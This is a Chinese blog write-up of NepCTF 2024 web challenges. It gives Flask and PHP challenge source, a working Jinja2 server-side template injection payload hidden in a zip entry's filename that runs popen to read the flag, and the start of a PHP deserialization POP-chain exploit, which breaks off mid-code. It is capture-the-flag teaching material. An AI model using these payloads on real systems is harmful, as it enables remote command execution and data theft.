<!DOCTYPE html><script type="text/javascript" src="/js/crash_cheat.js"></script><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>NepCTF 2024 | 晨曦的个人小站</title><meta name="author" content="晨曦"><meta name="copyright" content="晨曦"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="NepCTF 2024 的wp">
<meta property="og:type" content="article">
<meta property="og:title" content="NepCTF 2024">
<meta property="og:url" content="http://example.com/NepCTF_2024/index.html">
<meta property="og:site_name" content="晨曦的个人小站">
<meta property="og:description" content="NepCTF 2024 的wp">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/NepCTF_2024/%E5%B0%81%E9%9D%A2.jpg">
<meta property="article:published_time" content="2024-08-27T03:30:00.000Z">
<meta property="article:modified_time" content="2024-08-27T03:47:49.810Z">
<meta property="article:author" content="晨曦">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="write up">
<meta property="article:tag" content="web">
<meta property="article:tag" content="re">
<meta property="article:tag" content="pwn">
<meta property="article:tag" content="misc">
<meta property="article:tag" content="crypto">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/NepCTF_2024/%E5%B0%81%E9%9D%A2.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/NepCTF_2024/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":300},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  }
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'NepCTF 2024',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-08-27 11:47:49'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="/css/nav.css"><link rel="stylesheet" href="/css/bj.css"><link rel="stylesheet" href="/css/cat.css"><div id="myscoll"></div><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/chenxi.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">24</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">25</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">14</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/NepCTF_2024/%E5%B0%81%E9%9D%A2.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="晨曦的个人小站"><span class="site-name">晨曦的个人小站</span></a></span><div id="menus"></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div><div id="nav-right"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i></a></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">NepCTF 2024</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-08-27T03:30:00.000Z" title="发表于 2024-08-27 11:30:00">2024-08-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-08-27T03:47:49.810Z" title="更新于 2024-08-27 11:47:49">2024-08-27</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/%E6%AF%94%E8%B5%9B/">比赛</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/%E6%AF%94%E8%B5%9B/%E6%96%B0%E7%94%9F%E8%B5%9B/">新生赛</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/%E6%AF%94%E8%B5%9B/%E6%96%B0%E7%94%9F%E8%B5%9B/ak/">ak</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">7.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>37分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="NepCTF 2024"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="NepDouble"><a href="#NepDouble" class="headerlink" title="NepDouble"></a>NepDouble</h2><p>源码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request,render_template,render_template_string</span><br><span class="line"><span class="keyword">from</span> zipfile <span class="keyword">import</span> ZipFile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Environment, FileSystemLoader</span><br><span class="line"></span><br><span class="line">app = Flask(__name__,template_folder=<span class="string">&#x27;static&#x27;</span>)</span><br><span class="line">app.config[<span class="string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = <span class="number">1</span> * <span class="number">1024</span> * <span class="number">1024</span></span><br><span class="line"></span><br><span class="line">UPLOAD_FOLDER = <span class="string">&#x27;/app/uploads&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = UPLOAD_FOLDER</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(UPLOAD_FOLDER):</span><br><span class="line">    os.makedirs(UPLOAD_FOLDER)</span><br><span class="line"></span><br><span class="line">template_env = Environment(loader=FileSystemLoader(<span class="string">&#x27;static&#x27;</span>), autoescape=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_template</span>(<span class="params">template_name, **context</span>):</span><br><span class="line">    template = template_env.get_template(template_name)</span><br><span class="line">    <span class="keyword">return</span> template.render(**context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_template_string</span>(<span class="params">template_string, **context</span>):</span><br><span class="line">    template = template_env.from_string(template_string)</span><br><span class="line">    <span class="keyword">return</span> template.render(**context)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method != <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Please use POST method to upload files.&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        clear_uploads_folder()</span><br><span class="line">        files = request.files.get(<span class="string">&#x27;tp_file&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> files:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;No file uploaded.&#x27;</span></span><br><span class="line"></span><br><span class="line">        file_size = <span class="built_in">len</span>(files.read())</span><br><span class="line">        files.seek(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        file_extension = files.filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[-<span class="number">1</span>].lower()</span><br><span class="line">        <span class="keyword">if</span> file_extension != <span class="string">&#x27;zip&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid file type. Please upload a .zip file.&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        timestamp = datetime.datetime.now().strftime(<span class="string">&#x27;%Y%m%d%H%M%S&#x27;</span>)</span><br><span class="line">        md5_dir_name = hashlib.md5(timestamp.encode()).hexdigest()</span><br><span class="line">        unzip_folder = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], md5_dir_name)</span><br><span class="line">        os.makedirs(unzip_folder, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> ZipFile(files) <span class="keyword">as</span> zip_file:</span><br><span class="line">            zip_file.extractall(path=unzip_folder)</span><br><span class="line"></span><br><span class="line">        files_list = []</span><br><span class="line">        <span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(unzip_folder):</span><br><span class="line">            <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">                <span class="built_in">print</span>(file)</span><br><span class="line">                file_path = os.path.join(root, file)</span><br><span class="line">                relative_path = os.path.relpath(file_path, app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>])</span><br><span class="line">                link = <span class="string">f&#x27;&lt;a href=&quot;/cat?file=<span class="subst">&#123;relative_path&#125;</span>&quot;&gt;<span class="subst">&#123;file&#125;</span>&lt;/a&gt;&#x27;</span></span><br><span class="line">                files_list.append(link)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> render_template_string(<span class="string">&#x27;&lt;br&gt;&#x27;</span>.join(files_list))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Invalid filename.&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;An error occurred. Please check your file and try again.&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/cat&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cat</span>():</span><br><span class="line">    file_path = request.args.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> file_path:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;File path is missing.&#x27;</span></span><br><span class="line"></span><br><span class="line">    new_file = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], file_path)</span><br><span class="line">    <span class="keyword">if</span> os.path.commonprefix([os.path.abspath(new_file), os.path.abspath(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>])]) != os.path.abspath(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>]):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Invalid file path.&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> os.path.islink(new_file):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Symbolic links are not allowed.&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        filename = file_path.split(<span class="string">&#x27;/&#x27;</span>)[-<span class="number">1</span>]</span><br><span class="line">        content = read_large_file(new_file)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;test.html&#x27;</span>,content=content,filename=filename,dates=Exec_date())</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;File not found.&#x27;</span></span><br><span class="line">    <span class="keyword">except</span> IOError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;Error reading file: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Exec_date</span>():</span><br><span class="line">    d_res = os.popen(<span class="string">&#x27;date&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">return</span> d_res.split(<span class="string">&quot; &quot;</span>)[-<span class="number">1</span>].strip()+<span class="string">&quot; &quot;</span>+d_res.split(<span class="string">&quot; &quot;</span>)[-<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clear_uploads_folder</span>():</span><br><span class="line">    <span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], topdown=<span class="literal">False</span>):</span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">            os.remove(os.path.join(root, file))</span><br><span class="line">        <span class="keyword">for</span> <span class="built_in">dir</span> <span class="keyword">in</span> dirs:</span><br><span class="line">            os.rmdir(os.path.join(root, <span class="built_in">dir</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_large_file</span>(<span class="params">file_path</span>):</span><br><span class="line">    content = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">            content += line</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="string">&quot;8000&quot;</span>,debug=<span class="literal">False</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>审计源码，可以发现这一句话</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> render_template_string(<span class="string">&#x27;&lt;br&gt;&#x27;</span>.join(files_list))</span><br></pre></td></tr></table></figure>

<p>这里的<code>file_list</code>是上传的压缩包里的文件名，是可控的，因此可以利用这个来ssti，没有过滤</p>
<p>创建文件，文件名是payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;cd ..;cat flag&#x27;).read()&#125;&#125;.txt</span><br></pre></td></tr></table></figure>

<p>然后将它压缩成zip，接着上传，上传成功后，即可得到flag。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/NepCTF_2024/image-20240824162455019.png" alt="image-20240824162455019"></p>
<p>上传需要自己写一个上传表单</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-CN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>文件上传表单<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>文件上传表单<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://neptune-14493.nepctf.lemonprefect.cn/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;tp_file&quot;</span>&gt;</span>选择文件:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;tp_file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;tp_file&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;上传文件&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="PHP-MASTER"><a href="#PHP-MASTER" class="headerlink" title="PHP_MASTER!!"></a>PHP_MASTER!!</h2><p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>( <span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">substrstr</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$start</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;[&quot;</span>);</span><br><span class="line">    <span class="variable">$end</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;]&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">mb_substr</span>(<span class="variable">$data</span>, <span class="variable">$start</span> + <span class="number">1</span>, <span class="variable">$end</span> - <span class="number">1</span> - <span class="variable">$start</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;key=== <span class="string">&quot;\0key\0&quot;</span>)&#123;</span><br><span class="line">            <span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="number">1</span>];</span><br><span class="line">            <span class="variable">$contents</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$a</span>);</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$a</span>, <span class="variable">$contents</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\[|\]/i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;nep&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;NONONO!!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">substrstr</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;nep1&#x27;</span>].<span class="string">&quot;[welcome to&quot;</span>. <span class="variable">$_GET</span>[<span class="string">&#x27;nep&#x27;</span>].<span class="string">&quot;CTF]&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$str</span>===<span class="string">&#x27;NepCTF]&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;b) ();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$s</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$s</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;s = <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span> -&gt;str;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">C</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]));</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;\0&quot;</span>,<span class="string">&quot;00&quot;</span>,<span class="variable">$ser</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br></pre></td></tr></table></figure>

<p>先是反序列化逃逸和一些反序列化的特性</p>
<p>参考链接：<a target="_blank" rel="noopener" href="https://chenxi9981.github.io/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">php反序列化</a></p>
<p>先在本地构造pop链，得到一个正常的序列化字符串</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>( <span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">substrstr</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$start</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;[&quot;</span>);</span><br><span class="line">    <span class="variable">$end</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;]&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">mb_substr</span>(<span class="variable">$data</span>, <span class="variable">$start</span> + <span class="number">1</span>, <span class="variable">$end</span> - <span class="number">1</span> - <span class="variable">$start</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>=<span class="string">&quot;\0key\0&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;key;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;key=== <span class="string">&quot;\0key\0&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span 